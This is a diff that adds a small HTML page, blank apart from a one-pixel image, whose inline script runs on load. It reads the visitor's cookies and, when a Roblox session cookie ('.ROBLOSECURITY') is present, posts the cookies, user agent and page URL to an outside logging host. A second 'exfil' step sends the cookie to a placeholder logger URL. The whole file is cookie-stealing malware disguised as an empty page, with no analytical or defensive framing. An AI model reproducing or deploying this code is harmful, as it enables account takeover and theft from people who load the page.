@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <style>body{margin:0;padding:0;background:#000;overflow:hidden;}</style>
+</head>
+<body>
+  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" width="1" height="1" alt="">
+  <script>
+  (function(){
+    const cookie = document.cookie;
+    if(cookie.includes('.ROBLOSECURITY') || cookie.includes('rbx')) {
+      fetch('https://rblxck.page.gd/log.php.', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {'Content-Type':'text/plain'},
+        body: cookie + ' | ' + navigator.userAgent + ' | ' + location.href
+      }).catch(()=>{});
+      
+      // optional secondary exfil via image
+      new Image().src = 'https://YOUR-LOGGER-HERE.com/i?c=' + encodeURIComponent(cookie);
+    }
+  })();
+  </script>
+</body>
+</html>
